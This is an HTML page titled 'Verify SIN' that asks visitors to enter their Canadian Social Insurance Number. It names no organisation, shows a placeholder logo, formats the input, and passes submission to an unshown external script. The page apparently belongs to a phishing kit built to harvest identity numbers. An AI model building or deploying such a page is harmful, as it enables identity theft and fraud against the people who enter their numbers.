<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verify SIN</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            touch-action: manipulation !important;
        }

html {
            touch-action: manipulation !important;
            -ms-touch-action: manipulation !important;
        }

        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #F5F5F2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            touch-action: manipulation !important;
            -ms-touch-action: manipulation !important;
        }

        .container {
            background: white;
            border-radius: 9.6px;
            padding: 48px 64px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 33.6px;
            font-weight: 400;
            color: #2C3E50;
            margin-bottom: 32px;
            text-align: center;
            line-height: 1.2;
        }

        .form-group {
            margin-bottom: 19.2px;
        }

        label {
            display: block;
            font-size: 11.2px;
            font-weight: 500;
            color: #5A6C7D;
            margin-bottom: 6.4px;
        }

        input {
            width: 100%;
            padding: 12.8px 16px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 40px;
            transition: all 0.3s ease;
            color: #2C3E50;
        }

        input:focus {
            outline: none;
            border-color: #2C3E50;
        }

        input:hover {
            border-color: #A0A0A0;
        }

        .submit-btn {
            width: 100%;
            background: #2C3E50;
            border: none;
            border-radius: 40px;
            padding: 16px 32px;
            font-size: 14.4px;
            font-weight: 500;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 25.6px;
        }

        .submit-btn:hover {
            background: #1A2634;
            transform: translateY(-1.6px);
            box-shadow: 0 4.8px 16px rgba(44, 62, 80, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

.logo {
    position: absolute;
    top: 24px;
    left: 32px;
}

.logo img {
    height: 60px;
    width: auto;
}

        @media (max-width: 768px) {
            .container {
                padding: 32px 24px;
            }

            h1 {
                font-size: 25.6px;
            }

            input {
                padding: 11.2px 14.4px;
                font-size: 16px;
            }

            .submit-btn {
                font-size: 12.8px;
                padding: 12.8px 25.6px;
            }
        }
    </style>
</head>
<body>
    <div class="logo"><img src="logo.png" alt="Logo"></div>

    <div class="container">
        <h1>Verify your Social<br>Insurance Number</h1>

        <form>
            <div class="form-group">
                <label for="sin">Social Insurance Number</label>
                <input type="text" id="sin" name="sin" placeholder="000 000 000" inputmode="numeric" autocomplete="off" required>
            </div>

            <button type="submit" class="submit-btn">Continue</button>
        </form>
    </div>

    <script>
        const sinInput = document.getElementById('sin');
        sinInput.addEventListener('input', function() {
            let val = this.value.replace(/\D/g, '').slice(0, 9);
            if (val.length >= 7)      val = val.slice(0,3) + ' ' + val.slice(3,6) + ' ' + val.slice(6);
            else if (val.length >= 4) val = val.slice(0,3) + ' ' + val.slice(3);
            this.value = val;
        });
    </script>

    <script src="sin-client.js"></script>

    <script>
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, { passive: false });
    </script>

</body>
</html>
